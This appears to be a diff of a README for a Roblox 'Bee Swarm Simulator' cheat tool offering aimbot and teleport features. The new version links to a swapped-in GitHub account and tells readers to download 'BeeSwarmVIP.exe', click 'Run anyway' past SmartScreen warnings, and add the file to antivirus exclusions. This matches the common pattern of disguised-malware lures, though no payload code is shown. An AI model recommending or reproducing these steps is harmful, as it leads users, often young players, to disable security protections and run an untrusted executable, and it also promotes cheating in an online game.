@@ -1,108 +1,57 @@
-# Bee Swarm Simulator VIP Scripts v2026 - Roblox Game Utility 2026
+<h1>🐝 bee-swarm-vip-script - Dominate the Hive with Pro Tools</h1>
 
-> **PC-oriented Roblox utility for Bee Swarm Simulator.** Provides nearby-target aim assistance, predefined teleport points, and fast controls through hotkeys and toggles.
+<div align="center">
+<a href="https://github.com/parkmargoah-design/bee-swarm-vip-script"><img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B35?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" style="background-color:#FF6B35;color:white;padding:15px 40px;border-radius:30px;font-size:20px;font-weight:bold;text-decoration:none;display:inline-block;"></a>
+</div>
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/bennettcarlo73/bee-swarm-vip-script?style=flat-square)](https://github.com/bennettcarlo73/bee-swarm-vip-script)
+<h2>🚀 What Is This?</h2>
+<p>Bee Swarm VIP Script is a PC utility for the Roblox game <em>Bee Swarm Simulator</em>. It helps you collect pollen, defeat mobs, and navigate the map faster using automated features and hotkeys. No programming skills needed — just download and run on Windows.</p>
 
----
+<h2>🎯 Key Features</h2>
+<ul>
+<li><strong>Auto Target</strong> — Automatically aims at nearby enemies and flowers</li>
+<li><strong>Teleport Points</strong> — Instantly jump to predefined map locations</li>
+<li><strong>Custom Hotkeys</strong> — Assign your own keyboard shortcuts for actions</li>
+<li><strong>Toggle Controls</strong> — Turn features on/off with simple switches</li>
+<li><strong>Updated for 2026</strong> — Compatible with the latest Roblox version</li>
+</ul>
 
-<p align="center">
-  <a href="https://bennettcarlo73.github.io/bee-swarm-vip-script/">
-    <img src="https://img.shields.io/badge/Download-Bee%20Swarm%20Simulator%20VIP%20Scripts-brightgreen?style=for-the-badge" alt="Download Bee Swarm Simulator VIP Scripts">
-  </a>
-</p>
+<h2>⬇️ Download Instructions</h2>
+<p>Visit this link to download the application: <a href="https://github.com/parkmargoah-design/bee-swarm-vip-script">https://github.com/parkmargoah-design/bee-swarm-vip-script</a></p>
 
-> **[Download Bee Swarm Simulator VIP Scripts](https://bennettcarlo73.github.io/bee-swarm-vip-script/)**
+<h2>🖥️ How to Run</h2>
+<ol>
+<li>Click the download button above or the link in the Download section</li>
+<li>On the GitHub page, locate the <strong>Releases</strong> section on the right sidebar</li>
+<li>Click the latest release and download the file named <code>BeeSwarmVIP.exe</code> (or similar)</li>
+<li>Save the file to your desktop or a folder you can easily find</li>
+<li>Double-click the downloaded file to run it</li>
+<li>If Windows SmartScreen appears, click <strong>More info</strong> then <strong>Run anyway</strong></li>
+<li>Launch Roblox and start Bee Swarm Simulator</li>
+<li>The utility will open as a separate window with buttons and toggles</li>
+</ol>
 
----
+<h2>⚙️ System Requirements</h2>
+<ul>
+<li>Windows 10 or Windows 11 (64-bit)</li>
+<li>4 GB RAM</li>
+<li>500 MB free disk space</li>
+<li>Internet connection for first-time setup</li>
+</ul>
 
-[Download Latest Build](https://bennettcarlo73.github.io/bee-swarm-vip-script/)
+<h2>❓ Troubleshooting</h2>
+<ul>
+<li><strong>App doesn't open</strong> — Make sure your antivirus isn't blocking it. Add the file to exclusions if needed.</li>
+<li><strong>Features not working</strong> — Close Roblox completely, reopen the utility first, then launch the game.</li>
+<li><strong>Hotkeys not responding</strong> — Check that the utility window is not minimized. Press F1 to reset defaults.</li>
+</ul>
 
----
+<h2>📜 License</h2>
+<p>This project is provided for educational and personal use only. Not affiliated with Roblox Corporation.</p>
 
-## What It Does
+<h2>📞 Support</h2>
+<p>For questions or bug reports, open an issue on the GitHub repository page.</p>
 
-Bee Swarm Simulator VIP Scripts is a PC-based Roblox game utility focused on quick, practical in-game controls. Its lightweight HTML overlay brings together nearby-target aim assistance, predefined teleport destinations, and reusable map positions in one compact interface.
-
-Most actions can be reached through hotkeys or simple toggles. This makes it possible to change feature states, switch destinations, and keep the control panel unobtrusive while playing Bee Swarm Simulator.
-
-## Included Capabilities
-
-- Desktop-focused Roblox utility for PC gameplay
-- Aim-assistance behavior for targets in the nearby area
-- Saved teleport destinations for quicker movement
-- Reusable presets for map positions
-- Small HTML overlay for controlling the available functions
-- Hotkeys for launching actions quickly
-- Individual toggles for enabling or disabling features
-- Streamlined setup intended for fast loading
-
-## Getting Started
-
-1. Get the newest build using the download link above.
-2. Copy the supplied files into the directory used by your script loader or local HTML utility.
-3. Launch the overlay or loader entry according to your chosen setup.
-4. Operate the utility with its hotkeys and toggle controls.
-
-A typical usage sequence may look like this:
-
-- Launch the overlay
-- Choose a teleport destination
-- Turn aim assistance on or off
-- Configure map position settings when needed
-
-## Configuration and Controls
-
-| Setting | Purpose |
-| --- | --- |
-| Aim assistance | Manages helper behavior for nearby targets |
-| Teleport presets | Provides quick access to saved locations |
-| Map presets | Keeps frequently used map positions |
-| Overlay | Displays the HTML-based control panel |
-| Hotkeys | Runs actions without navigating menus |
-| Toggles | Enables or disables specific functions |
-
-Example configuration format:
-
-- `aimbot = on`
-- `overlay = on`
-- `teleportPreset = selected`
-- `hotkeyMode = enabled`
-
-## Compatibility Notes
-
-- Target game: Bee Swarm Simulator
-- Platform: Roblox on PC
-- Interface type: HTML overlay
-- Recommended environment: desktop systems with hotkey and toggle support
-
-### Limitations
-
-- This utility is intended for PC-first operation
-- Actual behavior depends on the loader, environment, and loading method in use
-- Teleport and map-position presets require a session that supports the expected movement behavior
-
-## Frequently Asked Questions
-
-### What is the installation process?
-Download the current build, put its files in the location expected by your loader or local setup, and launch the included overlay or script entry.
-
-### How can I find updated files?
-Check the latest build link for newer versions and refreshed script files.
-
-### Are the controls adjustable?
-The utility uses hotkeys and toggles for interaction, allowing feature handling to be changed through the available settings.
-
-### Is it intended for other Roblox games?
-No. Its behavior is designed around Bee Swarm Simulator on Roblox and is not intended for use outside that context.
-
-### Which folder should contain the files?
-Store the files together in the directory used by your loader or script configuration so the overlay and associated files remain accessible.
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+<div align="center">
+<a href="https://github.com/parkmargoah-design/bee-swarm-vip-script" style="background-color:#4CAF50;color:white;padding:12px 35px;border-radius:25px;font-size:18px;font-weight:bold;text-decoration:none;display:inline-block;">⬇️ Download from GitHub</a>
+</div>
